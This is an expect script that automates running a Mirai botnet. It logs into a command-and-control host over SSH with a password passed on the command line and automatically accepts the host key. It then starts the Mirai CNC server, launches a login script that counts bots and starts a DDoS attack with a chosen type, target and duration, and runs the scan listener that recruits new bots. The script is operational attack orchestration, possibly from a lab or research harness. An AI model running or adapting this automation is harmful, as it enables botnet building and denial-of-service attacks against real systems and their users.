#!/usr/bin/expect -f
set delKnownHosts [lindex $argv 0]
set hostname [lindex $argv 1]
set CNC_ip [lindex $argv 2]
set username [lindex $argv 3]
set password [lindex $argv 4]
set path [lindex $argv 5]
set pids_file [lindex $argv 6]
set numOfNewBots [lindex $argv 7]
set targetedDDoS [lindex $argv 8]
set DDoSType [lindex $argv 9]
set dur [lindex $argv 10]

set mirai_path "Mirai-Source-Code/mirai"
set scanListenOutput "ScanListenOutput.txt"
set scanFinishedFile "ScanFinishedFile.txt"
set debug_path "Mirai-Source-Code/mirai/debug"
set input_bot_file "input_bot"

set waitToFinishScan "WaitToFinishScan.py"
set login_sh "login.sh"

set timeout 120

# SSH connection
spawn /bin/bash $delKnownHosts
send "exit\r"
spawn ssh $username@$CNC_ip
expect "*continue connecting (yes/no*)? "
send "yes\r"
expect " password: "
send "$password\r"

expect "*:~# "
send "cd $path/$mirai_path\r"

expect "$mirai_path# "
send "chmod +x $path/$login_sh $path/$waitToFinishScan\r"

# Create CNC Server
expect "$mirai_path# "
send "nohup debug/cnc &\r"
# Login to count bots and run DDoS attack
#expect "*DB opened"
expect "output to 'nohup.out'"
send "\r"
expect "$mirai_path# "
send "nohup $path/./$login_sh $numOfNewBots $DDoSType $targetedDDoS $dur $path $CNC_ip &\r"
expect "output to 'nohup.out'"
send "\r"

# Run listening scanner server
expect "$mirai_path# "
send "nohup debug/scanListen > $path/$mirai_path/$scanListenOutput &\r"
expect "ignoring input and redirecting stderr to stdout"
send "\r"

# Wait to finish Scanning
expect "$mirai_path# "
send "nohup python3 $path/$waitToFinishScan $path $mirai_path/$scanListenOutput $scanFinishedFile $numOfNewBots $debug_path $input_bot_file &\r"
expect "output to 'nohup.out'"
send "\r"

expect "$mirai_path# "
send "ps -ef | grep 'debug/' | awk '{print \$2}' > $path/$pids_file\r"
expect "$mirai_path# "
send "ps -ef | grep '$path/./$login_sh' | awk '{print \$2}' >> $path/$pids_file\r"
expect "$mirai_path# "
send "ps -ef | grep 'python3 $path/$waitToFinishScan' | awk '{print \$2}' >> $path/$pids_file\r"

expect "$mirai_path# "
send "exit\r"
